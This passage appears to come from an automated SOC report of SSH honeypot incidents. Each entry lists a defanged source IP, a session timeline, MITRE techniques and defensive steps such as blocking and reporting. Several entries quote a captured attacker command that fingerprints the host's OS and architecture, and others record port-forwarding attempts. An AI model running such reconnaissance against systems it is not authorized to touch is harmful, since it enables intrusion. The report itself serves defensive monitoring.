| `2026-07-21 18:02:08` | `cowrie.login.success` |
| `2026-07-21 18:02:09` | `cowrie.direct-tcpip.request` |
| `2026-07-21 18:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.223.244[.]3` to AbuseIPDB if not already reported
- [ ] Block `163.223.244[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddf46be0ae9b

| Field | Detail |
|---|---|
| **Source IP** | `115.241.228[.]34` |
| **First Seen** | 2026-07-21 18:03 |
| **Last Seen** | 2026-07-21 18:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:03:17` | `cowrie.session.connect` |
| `2026-07-21 18:03:18` | `cowrie.client.version` |
| `2026-07-21 18:03:18` | `cowrie.client.kex` |
| `2026-07-21 18:03:21` | `cowrie.login.success` |
| `2026-07-21 18:03:21` | `cowrie.direct-tcpip.request` |
| `2026-07-21 18:03:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.228[.]34` to AbuseIPDB if not already reported
- [ ] Block `115.241.228[.]34` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a1bb813d1bc

| Field | Detail |
|---|---|
| **Source IP** | `117.205.2[.]250` |
| **First Seen** | 2026-07-21 18:03 |
| **Last Seen** | 2026-07-21 18:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:03:27` | `cowrie.session.connect` |
| `2026-07-21 18:03:27` | `cowrie.client.version` |
| `2026-07-21 18:03:27` | `cowrie.client.kex` |
| `2026-07-21 18:03:29` | `cowrie.login.success` |
| `2026-07-21 18:03:30` | `cowrie.direct-tcpip.request` |
| `2026-07-21 18:03:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.205.2[.]250` to AbuseIPDB if not already reported
- [ ] Block `117.205.2[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9e3d01e9252

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-21 18:04 |
| **Last Seen** | 2026-07-21 18:04 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:04:01` | `cowrie.session.connect` |
| `2026-07-21 18:04:03` | `cowrie.client.version` |
| `2026-07-21 18:04:03` | `cowrie.client.kex` |
| `2026-07-21 18:04:09` | `cowrie.login.success` |
| `2026-07-21 18:04:11` | `cowrie.session.params` |
| `2026-07-21 18:04:11` | `cowrie.command.input` |
| `2026-07-21 18:04:11` | `cowrie.command.input` |
| `2026-07-21 18:04:11` | `cowrie.command.input` |
| `2026-07-21 18:04:11` | `cowrie.command.input` |
| `2026-07-21 18:04:11` | `cowrie.command.input` |
| `2026-07-21 18:04:11` | `cowrie.command.success` |
| `2026-07-21 18:04:11` | `cowrie.command.input` |
| `2026-07-21 18:04:11` | `cowrie.command.input` |
| `2026-07-21 18:04:11` | `cowrie.command.input` |
| `2026-07-21 18:04:11` | `cowrie.command.input` |
| `2026-07-21 18:04:13` | `cowrie.log.closed` |
| `2026-07-21 18:04:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f32221478ed

| Field | Detail |
|---|---|
| **Source IP** | `171.243.150[.]251` |
| **First Seen** | 2026-07-21 18:04 |
| **Last Seen** | 2026-07-21 18:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:04:44` | `cowrie.session.connect` |
| `2026-07-21 18:04:44` | `cowrie.client.version` |
| `2026-07-21 18:04:44` | `cowrie.client.kex` |
| `2026-07-21 18:04:45` | `cowrie.login.success` |
| `2026-07-21 18:04:46` | `cowrie.direct-tcpip.request` |
| `2026-07-21 18:04:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-21 18:04:47` | `cowrie.direct-tcpip.data` |
| `2026-07-21 18:04:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.150[.]251` to AbuseIPDB if not already reported
- [ ] Block `171.243.150[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daa802f3506f

| Field | Detail |
|---|---|
| **Source IP** | `220.179.87[.]204` |
| **First Seen** | 2026-07-21 18:05 |
| **Last Seen** | 2026-07-21 18:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:05:04` | `cowrie.session.connect` |
| `2026-07-21 18:05:05` | `cowrie.client.version` |
| `2026-07-21 18:05:05` | `cowrie.client.kex` |
| `2026-07-21 18:05:07` | `cowrie.login.success` |
| `2026-07-21 18:05:08` | `cowrie.direct-tcpip.request` |
| `2026-07-21 18:05:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.179.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `220.179.87[.]204` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b568a5d7a6ae

| Field | Detail |
|---|---|
| **Source IP** | `117.70.94[.]155` |
| **First Seen** | 2026-07-21 18:05 |
| **Last Seen** | 2026-07-21 18:05 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:05:15` | `cowrie.session.connect` |
| `2026-07-21 18:05:16` | `cowrie.client.version` |
| `2026-07-21 18:05:16` | `cowrie.client.kex` |
| `2026-07-21 18:05:20` | `cowrie.login.success` |
| `2026-07-21 18:05:23` | `cowrie.direct-tcpip.request` |
| `2026-07-21 18:05:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.70.94[.]155` to AbuseIPDB if not already reported
- [ ] Block `117.70.94[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73ea5b037dcf

| Field | Detail |
|---|---|
| **Source IP** | `171.243.150[.]251` |
| **First Seen** | 2026-07-21 18:06 |
| **Last Seen** | 2026-07-21 18:07 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:06:51` | `cowrie.session.connect` |
| `2026-07-21 18:06:51` | `cowrie.client.version` |
| `2026-07-21 18:06:51` | `cowrie.client.kex` |
| `2026-07-21 18:07:03` | `cowrie.login.success` |
| `2026-07-21 18:07:04` | `cowrie.direct-tcpip.request` |
| `2026-07-21 18:07:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-21 18:07:04` | `cowrie.direct-tcpip.data` |
| `2026-07-21 18:07:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.150[.]251` to AbuseIPDB if not already reported
- [ ] Block `171.243.150[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-704db01b2583

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-21 18:07 |
| **Last Seen** | 2026-07-21 18:08 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:07:42` | `cowrie.session.connect` |
| `2026-07-21 18:07:43` | `cowrie.client.version` |
| `2026-07-21 18:07:43` | `cowrie.client.kex` |
| `2026-07-21 18:08:05` | `cowrie.login.success` |
| `2026-07-21 18:08:07` | `cowrie.session.params` |
| `2026-07-21 18:08:07` | `cowrie.command.input` |
| `2026-07-21 18:08:07` | `cowrie.command.input` |
| `2026-07-21 18:08:07` | `cowrie.command.input` |
| `2026-07-21 18:08:07` | `cowrie.command.input` |
| `2026-07-21 18:08:07` | `cowrie.command.input` |
| `2026-07-21 18:08:07` | `cowrie.command.success` |
| `2026-07-21 18:08:07` | `cowrie.command.input` |
| `2026-07-21 18:08:07` | `cowrie.command.input` |
| `2026-07-21 18:08:07` | `cowrie.command.input` |
| `2026-07-21 18:08:07` | `cowrie.command.input` |
| `2026-07-21 18:08:09` | `cowrie.log.closed` |
| `2026-07-21 18:08:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2cc1a9db4a8

| Field | Detail |
|---|---|
| **Source IP** | `171.243.148[.]53` |
| **First Seen** | 2026-07-21 18:10 |
| **Last Seen** | 2026-07-21 18:10 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:10:41` | `cowrie.session.connect` |
| `2026-07-21 18:10:41` | `cowrie.client.version` |
| `2026-07-21 18:10:41` | `cowrie.client.kex` |
| `2026-07-21 18:10:57` | `cowrie.login.success` |
| `2026-07-21 18:10:58` | `cowrie.direct-tcpip.request` |
| `2026-07-21 18:10:59` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-21 18:10:59` | `cowrie.direct-tcpip.data` |
| `2026-07-21 18:10:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.148[.]53` to AbuseIPDB if not already reported
- [ ] Block `171.243.148[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-964998285536

| Field | Detail |
|---|---|
| **Source IP** | `95.79.57[.]221` |
| **First Seen** | 2026-07-21 18:10 |
| **Last Seen** | 2026-07-21 18:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:10:58` | `cowrie.session.connect` |
| `2026-07-21 18:10:59` | `cowrie.client.version` |
| `2026-07-21 18:10:59` | `cowrie.client.kex` |
| `2026-07-21 18:11:00` | `cowrie.login.success` |
| `2026-07-21 18:11:00` | `cowrie.direct-tcpip.request` |
| `2026-07-21 18:11:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.79.57[.]221` to AbuseIPDB if not already reported
- [ ] Block `95.79.57[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fbfb2e83ecf

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-21 18:11 |
| **Last Seen** | 2026-07-21 18:11 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:11:14` | `cowrie.session.connect` |
| `2026-07-21 18:11:16` | `cowrie.client.version` |
| `2026-07-21 18:11:16` | `cowrie.client.kex` |
| `2026-07-21 18:11:18` | `cowrie.login.success` |
| `2026-07-21 18:11:21` | `cowrie.session.params` |
| `2026-07-21 18:11:21` | `cowrie.command.input` |
| `2026-07-21 18:11:21` | `cowrie.command.input` |
| `2026-07-21 18:11:21` | `cowrie.command.input` |
| `2026-07-21 18:11:21` | `cowrie.command.input` |
| `2026-07-21 18:11:21` | `cowrie.command.input` |
| `2026-07-21 18:11:21` | `cowrie.command.success` |
| `2026-07-21 18:11:21` | `cowrie.command.input` |
| `2026-07-21 18:11:21` | `cowrie.command.input` |
| `2026-07-21 18:11:21` | `cowrie.command.input` |
| `2026-07-21 18:11:21` | `cowrie.command.input` |
| `2026-07-21 18:11:25` | `cowrie.log.closed` |
| `2026-07-21 18:11:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d613f8592f36

| Field | Detail |
|---|---|
| **Source IP** | `171.243.148[.]53` |
| **First Seen** | 2026-07-21 18:12 |
| **Last Seen** | 2026-07-21 18:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:12:02` | `cowrie.session.connect` |
| `2026-07-21 18:12:02` | `cowrie.client.version` |
| `2026-07-21 18:12:02` | `cowrie.client.kex` |
| `2026-07-21 18:12:04` | `cowrie.login.success` |
| `2026-07-21 18:12:04` | `cowrie.direct-tcpip.request` |
| `2026-07-21 18:12:05` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-21 18:12:05` | `cowrie.direct-tcpip.data` |
| `2026-07-21 18:12:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.148[.]53` to AbuseIPDB if not already reported
- [ ] Block `171.243.148[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8930684a7a5a

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-21 18:13 |
| **Last Seen** | 2026-07-21 18:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:13:39` | `cowrie.session.connect` |
| `2026-07-21 18:13:39` | `cowrie.client.version` |
| `2026-07-21 18:13:40` | `cowrie.client.kex` |
| `2026-07-21 18:13:40` | `cowrie.login.success` |
| `2026-07-21 18:13:40` | `cowrie.session.params` |
| `2026-07-21 18:13:40` | `cowrie.command.input` |
| `2026-07-21 18:13:41` | `cowrie.log.closed` |
| `2026-07-21 18:13:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a3ea7634afe

| Field | Detail |
|---|---|
| **Source IP** | `190.12.109[.]162` |
| **First Seen** | 2026-07-21 18:14 |
| **Last Seen** | 2026-07-21 18:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:14:23` | `cowrie.session.connect` |
| `2026-07-21 18:14:24` | `cowrie.client.version` |
| `2026-07-21 18:14:24` | `cowrie.client.kex` |
| `2026-07-21 18:14:27` | `cowrie.login.success` |
| `2026-07-21 18:14:28` | `cowrie.direct-tcpip.request` |
| `2026-07-21 18:14:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.12.109[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.12.109[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cd0b1e47c3a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-21 18:18 |
| **Last Seen** | 2026-07-21 18:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:18:18` | `cowrie.session.connect` |
| `2026-07-21 18:18:18` | `cowrie.client.version` |
| `2026-07-21 18:18:18` | `cowrie.client.kex` |
| `2026-07-21 18:18:22` | `cowrie.login.success` |
| `2026-07-21 18:18:23` | `cowrie.session.params` |
| `2026-07-21 18:18:23` | `cowrie.command.input` |
| `2026-07-21 18:18:23` | `cowrie.command.input` |
| `2026-07-21 18:18:23` | `cowrie.command.input` |
| `2026-07-21 18:18:23` | `cowrie.command.input` |
| `2026-07-21 18:18:23` | `cowrie.command.input` |
| `2026-07-21 18:18:23` | `cowrie.command.success` |
| `2026-07-21 18:18:23` | `cowrie.command.input` |
| `2026-07-21 18:18:23` | `cowrie.command.input` |
| `2026-07-21 18:18:23` | `cowrie.command.input` |
| `2026-07-21 18:18:23` | `cowrie.command.input` |
| `2026-07-21 18:18:25` | `cowrie.log.closed` |
| `2026-07-21 18:18:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd80cf6bf61b

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-21 18:20 |
| **Last Seen** | 2026-07-21 18:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:20:58` | `cowrie.session.connect` |
| `2026-07-21 18:20:58` | `cowrie.client.version` |
| `2026-07-21 18:20:58` | `cowrie.client.kex` |
| `2026-07-21 18:20:58` | `cowrie.login.success` |
| `2026-07-21 18:20:59` | `cowrie.session.params` |
| `2026-07-21 18:20:59` | `cowrie.command.input` |
| `2026-07-21 18:20:59` | `cowrie.log.closed` |
| `2026-07-21 18:20:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4b9a661c191

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-21 18:21 |
| **Last Seen** | 2026-07-21 18:21 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:21:41` | `cowrie.session.connect` |
| `2026-07-21 18:21:42` | `cowrie.client.version` |
| `2026-07-21 18:21:42` | `cowrie.client.kex` |
| `2026-07-21 18:21:49` | `cowrie.login.success` |
| `2026-07-21 18:21:53` | `cowrie.session.params` |
| `2026-07-21 18:21:53` | `cowrie.command.input` |
| `2026-07-21 18:21:53` | `cowrie.command.input` |
| `2026-07-21 18:21:53` | `cowrie.command.input` |
| `2026-07-21 18:21:53` | `cowrie.command.input` |
| `2026-07-21 18:21:53` | `cowrie.command.input` |
| `2026-07-21 18:21:53` | `cowrie.command.success` |
| `2026-07-21 18:21:53` | `cowrie.command.input` |
| `2026-07-21 18:21:53` | `cowrie.command.input` |
| `2026-07-21 18:21:53` | `cowrie.command.input` |
| `2026-07-21 18:21:53` | `cowrie.command.input` |
| `2026-07-21 18:21:55` | `cowrie.log.closed` |
| `2026-07-21 18:21:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c849a7b94a3f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-21 18:25 |
| **Last Seen** | 2026-07-21 18:25 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:25:00` | `cowrie.session.connect` |
| `2026-07-21 18:25:03` | `cowrie.client.version` |
| `2026-07-21 18:25:03` | `cowrie.client.kex` |
| `2026-07-21 18:25:09` | `cowrie.login.success` |
| `2026-07-21 18:25:11` | `cowrie.session.params` |
| `2026-07-21 18:25:11` | `cowrie.command.input` |
| `2026-07-21 18:25:11` | `cowrie.command.input` |
| `2026-07-21 18:25:11` | `cowrie.command.input` |
| `2026-07-21 18:25:11` | `cowrie.command.input` |
| `2026-07-21 18:25:11` | `cowrie.command.input` |
| `2026-07-21 18:25:11` | `cowrie.command.success` |
| `2026-07-21 18:25:11` | `cowrie.command.input` |
| `2026-07-21 18:25:11` | `cowrie.command.input` |
| `2026-07-21 18:25:11` | `cowrie.command.input` |
| `2026-07-21 18:25:11` | `cowrie.command.input` |
| `2026-07-21 18:25:12` | `cowrie.log.closed` |
| `2026-07-21 18:25:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
